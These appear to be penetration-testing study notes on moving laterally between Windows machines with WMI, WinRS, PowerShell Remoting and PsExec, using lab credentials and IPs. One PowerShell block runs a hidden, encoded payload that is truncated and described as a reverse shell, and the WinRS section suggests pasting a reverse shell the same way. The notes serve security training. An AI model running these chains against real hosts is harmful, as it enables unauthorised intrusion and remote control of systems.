### What is WMI:
WMI (Windows Management Instrumentation) is a Microsoft technology that provides a standardized way to manage and retrieve information about Windows-based systems. It allows administrators, developers, and security professionals to interact with various system components using scripts or applications.

- wmi is capable of creating processes and it communicates via rpc on port 135 for remote access. wmi is able to execute commands remotely on another machine and collect data
### Requirements:
- we need credentials of a member of the Administrators local group, which can also be a domain user.

```
wmic /node:TARGET-PC /user:DOMAIN\admin /password:PASSWORD process call create "cmd.exe /c calc.exe"
```

- This will execute `calc.exe` on `TARGET-PC` using the given credentials.


### Powershell

#### What is PSCredential
A **PSCredential** object in PowerShell is a secure way to store and handle credentials (username and password) for authentication in scripts. 

```
# Define username
$username = "admin"

# Convert plain-text password to SecureString
$password = ConvertTo-SecureString "MySecurePass123!" -AsPlainText -Force

# Create PSCredential object
$credential = New-Object System.Management.Automation.PSCredential ($username, $password)

# Display the username (password remains secure)
$credential.UserName
```

#### Creating a process
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process `
    -MethodName Create -Arguments @{CommandLine = $Command}
```

### **What Does This Command Do?**

- **`Invoke-CimMethod`** → Calls a method on a CIM class (a WMI class).
- **`-CimSession $Session`** → Specifies the CIM session, which represents a connection to a remote machine.
- **`-ClassName Win32_Process`** → Uses the `Win32_Process` WMI class, which is responsible for managing system processes.
- **`-MethodName Create`** → Calls the `Create` method of `Win32_Process`, which is used to start a new process.
- **`-Arguments @{CommandLine = $Command}`** → Provides the arguments for the method, where:
    - `CommandLine = $Command` means it will execute the command stored in `$Command`.
- Example
```
$Command = "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command `"Get-Process`""
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

- using this we can run a powershell rev shell and get a connection back from remote computer
```# Step 1: Create Credentials
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Step 2: Establish CIM Session with Remote Machine (DCOM)
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options

# Step 3: Define Encoded PowerShell Payload
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGU...'

# Step 4: Execute Remote Command via Win32_Process.Create
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```


### Winrs
**WinRS (Windows Remote Shell)** is a command-line utility in Windows that allows users to execute commands remotely on a target machine using **WinRM (Windows Remote Management)**. It provides a way to run PowerShell or CMD commands on a remote system without needing to log in directly.

#### Requirements
- Winrm must be enabled on target machine
- The user running `winrs` must be in the **Administrators** or **Remote Management Users** group on the target machine
```
winrs -r:RemoteHost -u:Username -p:Password "cmd /c hostname & whoami"
```
As a final argument, we want to specify the commands to be executed on the remote host. we can paste a  power shell rev shell payload and get a rev connection.

### Powershell Remoting
**PowerShell Remoting** is a feature that allows you to run PowerShell commands and scripts on remote computers over the network using **WinRM (Windows Remote Management)**.

#### Requirements:
- Powershell remoting must be enabled
- Winrm service must be run
```
# Define target username and password
$username = 'jen'
$password = 'Nexus123!'

# Convert password to a secure string
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force

# Create a PSCredential object
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Establish a remote PowerShell session using WinRM
$session = New-PSSession -ComputerName 192.168.50.73 -Credential $credential

# enter the created session
Enter-PSSession 1

```


### PsExec

#### Requirements
-  **Admin privileges** on the target  
- **ADMIN$ share enabled**  
-  **File and Printer Sharing enabled**  
-  **PsExec binary transferred** to the compromised machine
```
PsExec.exe -i \\TARGET -u USERNAME -p PASSWORD <command_we_wanna_run>
```

